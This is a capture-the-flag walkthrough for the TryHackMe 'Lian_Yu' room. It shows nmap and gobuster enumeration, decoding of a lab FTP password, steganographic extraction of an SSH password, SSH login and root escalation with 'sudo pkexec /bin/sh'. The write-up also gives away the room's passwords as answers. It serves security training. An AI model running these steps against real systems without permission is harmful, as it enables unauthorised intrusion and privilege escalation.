# [Lian_Yu](https://tryhackme.com/room/lianyu)

## A beginner level security challenge

# Find the Flags

### What is the Web Directory you found?

_In numbers_

1. Initial reconnaissance with nmap to identify open services and ports

```bash
nmap -sV <TARGET_IP>
```

[SCREEN01]

2. Directory enumeration using gobuster with a standard wordlist followed by a custom numeric wordlist for the `/island` path
   - Directory found: `/island/2100`

```bash
gobuster dir -u http://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
seq 1000 9999 > numbers.txt
gobuster dir -u http://<TARGET_IP>/island -w numbers.txt
```

[SCREEN02]
[SCREEN03]

---

### what is the file name you found?

_How would you search a file/directory by extension?_

1. File enumeration within the discovered directory using extension-specific search to identify ticket files
   - File found: `green_arrow.ticket`

```bash
gobuster dir -u http://<TARGET_IP>/island/2100 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
```

[SCREEN04]

---

### what is the FTP Password?

_Looks like base? https://gchq.github.io/CyberChef/_

1. Analysis of the ticket file at `http://<TARGET_IP>/island/2100/green_arrow.ticket` reveals an encoded string `RTy8yhBQdscX`. Decoding this Base58 encoded string using [CyberChef](https://gchq.github.io/CyberChef/) yields the FTP password: `!#th3h00d`

[SCREEN05]

---

### what is the file name with SSH password?

1. FTP credentials discovery requires examining the source code of `http://<TARGET_IP>/island/` to locate the username

   - FTP credentials: `vigilante:!#th3h00d`

2. FTP session to retrieve available files from the server

```bash
ftp <TARGET_IP>
ls -la
mget *
```

[SCREEN06]

3. File analysis reveals steganographic content requiring extraction. The corrupted PNG file header needs repair before steganographic analysis.
   - File containing SSH password: `shado`
   - SSH password extracted: `M3tahuman`

```bash
hexdump -C Leave_me_alone.png | head
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' > fixed_Leave_me_alone.png
tail -c +9 Leave_me_alone.png >> fixed_Leave_me_alone.png
steghide extract -sf aa.jpg # password is password
```

---

### user.txt

1. SSH access using discovered credentials to retrieve the user flag.

```bash
ssh slade@<TARGET_IP>
cat /home/slade/user.txt
```

[SCREEN07]

---

### root.txt

1. Privilege escalation enumeration to identify sudo permissions and potential exploitation vectors

```bash
sudo -l
```

[SCREEN08]

2. Exploitation using pkexec binary with sudo privileges. Reference [GTFOBins](https://gtfobins.github.io/gtfobins/pkexec) for `pkexec` exploitation techniques

```bash
sudo pkexec /bin/sh
cat /root/root.txt
```

[SCREEN09]
